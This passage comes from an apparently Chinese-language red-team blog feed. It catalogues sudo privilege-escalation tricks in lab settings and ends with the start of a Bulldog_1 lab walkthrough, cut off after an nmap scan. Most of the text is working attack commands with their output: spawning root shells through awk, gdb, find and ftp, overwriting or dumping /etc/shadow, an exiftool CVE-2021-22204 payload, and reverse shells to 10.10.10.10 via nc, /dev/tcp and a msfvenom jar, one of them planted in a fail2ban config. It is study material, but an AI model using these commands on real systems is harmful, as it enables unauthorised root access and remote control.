class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><code>&#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>是 awk 的语法，是传递给 awk 的脚本。BEGIN 是 awk 的一个特殊模式，表示在处理任何输入行之前执行的动作。在这个脚本中，BEGIN 块中的唯一动作是调用 system 函数。system 函数用于在 awk 内部执行 shell 命令，这里的命令是 &#x2F;bin&#x2F;bash，也就是启动一个新的 bash shell</p><h4 id="sudo-base64"><a href="#sudo-base64" class="headerlink" title="sudo base64"></a>sudo base64</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ RedteamNotes=/etc/shadow<br>jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RedteamNotes</span>&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p>base32 、 base58、basenc、basez 等可以用同的方法</p><h4 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a>sudo bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><code>ash、csh、dash、sh、tclsh、zsh</code> 都是常用的 bash</p><h4 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ mkpasswd -m sha-512 123456<br>$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/<br><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$<br>root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ RedteamNotes=/etc/shadow<br>jackie@RedteamNotes:~$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span><br><span class="hljs-string">&#x27;root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCjCwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span><br>/tmp/tmp.bpJlJC5XIv<br>jackie@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /tmp/tmp.bpJlJC5XIv<br>root:$6$v9bEKME9H9vcitGI$.O4zh9.UbFFKIdQ3L0em9fa4dceluRA.ygQFF0e10Rs2aw8RD.iOjjfdCj<br>CwYSZzXaAfwDSyS3OKx8uBcUQSs/:19495:0:99999:7:::<br>jackie@RedteamNotes:~$ sudo /usr/bin/cp <span class="hljs-variable">$TF</span> <span class="hljs-variable">$RedteamNotes</span><br></code></pre></td></tr></table></figure><p>TF&#x3D;$(mktemp)做临时文件赋值给 TF，这种做临时文件的方式是专业的做法，是最佳实践，还是从安全和便捷角度考虑的。TF 是 Temp File，也可以根据需要自主命名。</p><h4 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo cpulimit -l 100 -f /bin/bash<br>Process 3082 detected<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>sudo cpulimit -l 100 -f &#x2F;bin&#x2F;sh 这个命令的目的是以超级用户权限限制 &#x2F;bin&#x2F;sh 命令的 CPU 使用率不超过 100%。</p><h4 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地生成哈希密码</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ mkpasswd -m sha-512 123456<br>$6$owj08NcJSU1z7CMp<span class="hljs-variable">$17Lc7yTSV27fe</span>/fwG.kShdwk02MkgvgwSfWZDG3iRJMQNBsG6pPtJQWJ3iaPes5WdrRl1ZFI4CRL.IEtfCD.y1<br><br><span class="hljs-comment"># 使用curl命令获取文件，并覆盖shadow文件</span><br>jackie@RedteamNotes:~$ sudo curl http://10.10.10.10/shadow_bespoke -o /etc/shadow<br></code></pre></td></tr></table></figure><h4 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -f 参数允许 date 从给定的文件中读取日期和时间。这个文件应包含一行或多行日期和时间信息。虽然报错/etc/shadow 文件却被显示出来。</span><br>jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">date</span> -f /etc/shadow<br><span class="hljs-built_in">date</span>: invalid <span class="hljs-built_in">date</span><br>‘root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::’<br></code></pre></td></tr></table></figure><h4 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a>sudo dd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$owj08NcJSU1z7CMp$17Lc7yTSV27fe/fwG.kShdwk02MkgvgwSfWZDG3iRJMQNBsG6pPtJQWJ3iaPes5WdrRl1ZFI4CRL.IEtfCD.y1:17298:0:99999:7:::&#x27;</span> | sudo <span class="hljs-built_in">dd</span> of=/etc/shadow<br><br></code></pre></td></tr></table></figure><p>dd 是一个命令行工具，常用在 Unix 和 Linux 系统中，用于对原始数据进行低级别的复制和转换。它非常灵活，可以用于许多任务，如复制数据、转换数据的编码、生成文件等。if 是输入，of 是输出。</p><h4 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ find / -name dstat -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/usr/share/doc/dstat<br>/usr/share/dstat<br><br><span class="hljs-comment"># 插件写入python文件</span><br>jackie@RedteamNotes:/usr/share/dstat$ <span class="hljs-built_in">cat</span> dstat_exploit.py<br>import os; os.execv(<span class="hljs-string">&quot;/bin/bash&quot;</span>, [<span class="hljs-string">&quot;bash&quot;</span>])<br><br><span class="hljs-comment"># 加载构造好的恶意插件</span><br>jackie@RedteamNotes:/usr/share/dstat$ sudo dstat --exploit<br>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="hljs-keyword">in</span> favour of importlib and slated <span class="hljs-keyword">for</span> removal <span class="hljs-keyword">in</span> Python 3.12; see the module\<span class="hljs-string">&#x27;s documentation</span><br><span class="hljs-string">for alternative uses</span><br><span class="hljs-string">import imp</span><br><span class="hljs-string">root@RedteamNotes:/usr/share/dstat#</span><br></code></pre></td></tr></table></figure><p>dstat 是一个用于系统监控和诊断的工具，它提供了实时的性能统计数据和系统资源使用情况。通过使用 dstat 命令，您可以获得关于 CPU、内存、磁盘、网络等方面的详细信息。</p><h4 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo ed<br>!/bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>ed 是一个编辑器，一个基于行的文本编辑器，它被设计成在终端中进行操作</p><h4 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo <span class="hljs-built_in">env</span> /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>env 通常用于设置和显示环境变量的值</p><h4 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a>sudo exiftool</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">stux@ubuntu:~$ exiftool -ver<br>12.05<br><span class="hljs-comment"># CVE-2021-22204，exiftool的12.05可以存在漏洞。一般认为exiftool 7.44-12.23都可能存在漏洞</span><br><br>stux@ubuntu:~$ vi payload<br>stux@ubuntu:~$ <span class="hljs-built_in">cat</span> payload<br>(metadata <span class="hljs-string">&quot;\c<span class="hljs-variable">$&#123;system(&#x27;/bin/bash&#x27;)&#125;</span>;&quot;</span>)<br>stux@ubuntu:~$ bzz payload payload.bzz<br>stux@ubuntu:~$ djvumake exploit.djvu INFO=<span class="hljs-string">&#x27;1,1&#x27;</span> BGjp=/dev/null ANTz=payload.bzz<br>stux@ubuntu:~$ sudo exiftool exploit.djvu<br>root@ubuntu:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>BZZ 是一种文件压缩格式，它提供了高压缩比和快速解压缩速度。BZZ 文件通常具有较小的文件大小，可以节省存储空间，并且在解压缩时不会对文件的完整性产生影响。</p><p>DjVuMake 是用于创建和转换 DjVu 文件的工具。DjVu 是一种图像压缩文件格式，主要用于扫描文档和电子书。与其他图像格式相比，DjVu 可以提供更高的压缩比，同时保持较好的图像质量。DjVuMake 工具可以将图像、文本和其他数据转换为 DjVu 格式，并且可以进行一些优化和配置，以满足特定需求。DjVu 文件通常用于在网络上共享大型扫描文档，以便更快地加载和浏览。</p><h4 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo expect -c <span class="hljs-string">&#x27;spawn /bin/bash;interact&#x27;</span><br>spawn /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>expect 能够模拟用户的键盘输入（例如，密码和其他响应），因此可以自动化需要用户交互的过程。它主要用于脚本和其他自动化环境中。</p><p>整个命令 <code>sudo expect -c &#39;spawn /bin/bash;interact&#39;</code> 将以 root 用户的身份在新的 shell 进程中开启一个交互式会话。-c 允许你直接在命令行中输入 expect 脚本代码，而不是从文件中读取。</p><h4 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找fail2ban的配置文件</span><br>jackie@RedteamNotes:/etc/fail2ban$ find / -name <span class="hljs-string">&quot;fail2ban*&quot;</span> -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/usr/share/doc/fail2ban<br>/usr/lib/python3/dist-packages/fail2ban-0.11.2.egg-info<br>/usr/lib/python3/dist-packages/fail2ban<br>/run/fail2ban<br>/var/lib/fail2ban<br>/etc/fail2ban<br>/etc/fail2ban/fail2ban.d<br><br><span class="hljs-comment"># 查看fail2ban的规则文件文件夹是否可写。</span><br>jackie@RedteamNotes:~$ find /etc -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br>/etc/fail2ban/action.d<br><br><span class="hljs-comment"># 查看配置文件权限</span><br>jackie@RedteamNotes:/etc/fail2ban$ <span class="hljs-built_in">ls</span> -liah jail.conf<br>442894 -rw-r--r-- 1 root root 25K May 22 09:27 jail.conf<br><br><span class="hljs-comment"># 虽然文件不可写，但文件夹是可写的，因此我们可以将文件重命名，然后复制成当前用户权限的文件</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">mv</span> iptables-multiport.conf iptablesmultiport.conf.bak<br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">cp</span> iptables-multiport.conf.bak iptables-multiport.conf<br></code></pre></td></tr></table></figure><p>mv 是移动文件，属主不变，cp 是创建文件属主会是操作者的数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 加入反弹shell的逻辑</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ vim iptables-multiport.conf<br>jackie@RedteamNotes:/etc/fail2ban/action.d$ <span class="hljs-built_in">cat</span> iptables-multiport.conf | grep<br>actionban<br><span class="hljs-comment"># Notes.: command executed once before each actionban command</span><br><span class="hljs-comment"># Option: actionban</span><br><span class="hljs-comment"># actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;</span><br>actionban = <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 9595 &gt;/tmp/f<br><br><span class="hljs-comment"># 重启fail2ban</span><br>jackie@RedteamNotes:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart<br>Restarting fail2ban (via systemctl): fail2ban.service.<br><br><span class="hljs-comment"># 快速尝试错误密码，进而触发action，从而实现反弹shell</span><br></code></pre></td></tr></table></figure><h4 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo find . -<span class="hljs-built_in">exec</span> /bin/bash \; -quit<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><code>\;</code> 则是 <code>-exec</code> 参数的结束符，告诉 <code>find</code> 命令 <code>-exec</code> 参数的内容到此为止。需要注意的是，<code>-exec</code> 命令后面的 <code>\;</code> 必须被转义（即加上 <code>\</code>），否则 shell 会将 <code>;</code> 解释为命令分隔符，这会导致 <code>-exec</code> 参数没有正确的结束，从而引发错误。因此我们需要写成 <code>\;</code>，而不是单独的 <code>;</code>。</p><h4 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h4><p><code>flock</code> : 这是一个在 Linux 中管理文件锁定的实用程序。它可以用来协调多个进程对文件或文件系统的访问，避免这些进程同时访问同一资源导致的问题。<code>-u</code> : 这是一个flock的选项，表示解锁。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo flock -u / /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo ftp<br>ftp&gt; !/bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>! 在这里是一个特殊的字符，表示要暂时离开 FTP 会话并在本地 shell 中执行命令。!的这个用法在 vi、ed 等编辑器场景下也存在。可以总结为一种通行做法。</p><h4 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gcc -wrapper /bin/bash,-s .<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><ol><li><code>-wrapper</code>：这是 gcc 的一个选项，它允许你在 gcc 调用实际编译器或链接器之前，先调用一个包装器（wrapper）脚本或程序。</li><li><code>,-s</code>：是 bash 带的一个选项，它使得 bash 在读取到 EOF 时不会退出（通常用于从标准输入读取命令）</li><li>最后那个.就是编译的源码，你给他任意源码也行，但因为不想编译任何东西，所以最简略的就是给他很通用的东西——当前目录的全部。</li></ol><h4 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gdb -nx -ex <span class="hljs-string">&#x27;!bash&#x27;</span> -ex quit<br>GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1<br>Copyright (C) 2022 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type <span class="hljs-string">&quot;show copying&quot;</span> and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.<br>Type <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br>For <span class="hljs-built_in">help</span>, <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br>Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>.<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><ol><li><code>-nx</code> : “no execute”这个选项告诉 gdb 在启动时不读取任何.gdbinit 文件。.gdbinit 文件是一个配置文件，gdb 在启动时会读取这个文件中的命令。</li><li><code>-ex</code> : “execute”这个选项允许你在 gdb 启动时执行一段 gdb 命令。”execute”</li><li><code>&#39;!bash&#39;</code> : 在 gdb 中，!用来执行 shell 命令，因此!bash 就是在 gdb 中启动一个 bash shell。</li><li><code>-ex quit</code> : 这个命令让 gdb 在执行完前面的命令之后退出。</li></ol><h4 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo git branch --<span class="hljs-built_in">help</span><br>!/bin/sh<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>git 用的标准 manual 工具，然后就可以用 manual 提权的思路了。和 less、more 的类似。</p><h4 id="sudo-gzip-x2F-gunzip"><a href="#sudo-gzip-x2F-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gzip -f /etc/shadow -t<br>root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ4<br>0sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::<br></code></pre></td></tr></table></figure><p>因为 sudo 允许命令以 root 用户的权限运行。当 gzip -t 尝试读取和测试 &#x2F;etc&#x2F;shadow 时，它实际上访问了这个包含敏感信息的文件</p><h4 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo hping3<br>hping3&gt; /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>Hping3 是一个强大的网络工具，主要用于分析和测试网络环境，生成各种类型的 ICMP、IP、TCP、UDP 或 RAW-IP 协议数据包。</p><h4 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@RedteamNotes:~$ sudo iftop<br>!/bin/bash<br>interface: eth0<br>IP address is: 10.10.10.12<br>MAC address is: 00:0c:29:b2:08:d5<br>root@RedteamNotes:/home/user<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>在 iftop 界面，输入！进入命令模式，输入&#x2F;bin&#x2F;bash 启动子 shell。iftop 是一个命令行的网络流量监控工具，用于实时显示一个网络接口的带宽使用情况。类似于 top 命令，它可以提供活动的网络连接和使用带宽的实时视图。</p><h4 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kali中生成反弹shell的jar包，将其上传到靶机</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ sudo msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f jar -o<br>shell.jar<br>[sudo] password <span class="hljs-keyword">for</span> kali:<br>Payload size: 7502 bytes<br>Final size of jar file: 7502 bytes<br>Saved as: shell.jar<br><br><span class="hljs-comment"># sudo 执行</span><br>jackie@RedteamNotes:/tmp$ sudo /usr/bin/java -jar shell.jar<br></code></pre></td></tr></table></figure><h4 id="sudo-jjs"><a href="#sudo-jjs" class="headerlink" title="sudo jjs"></a>sudo jjs</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这次GTFOBins的语句可能是不生效的，进场会彻底卡死靶机</span><br><span class="hljs-comment"># 参考了 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;exec 5&lt;&gt;/dev/tcp/10.10.10.10/9595;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#x27;]).waitFor()&quot;</span> | sudo jjs<br></code></pre></td></tr></table></figure><p>有些时候提高交互性可能会失败，这时候可以用 <code>echo $SHELL</code> 尝试探查，如果异常，可以新建一个反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>Privilege Escalation</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bulldog_1 靶机</title>
    <link href="/2023/07/57098f1aa06f.html"/>
    <url>/2023/07/57098f1aa06f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Bulldog-1-靶机"><a href="#Bulldog-1-靶机" class="headerlink" title="Bulldog_1 靶机"></a>Bulldog_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.123<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 23:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.123<br>Host is up (0.00028s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>23/tcp   open  telnet<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:07:AE:20 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.70 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 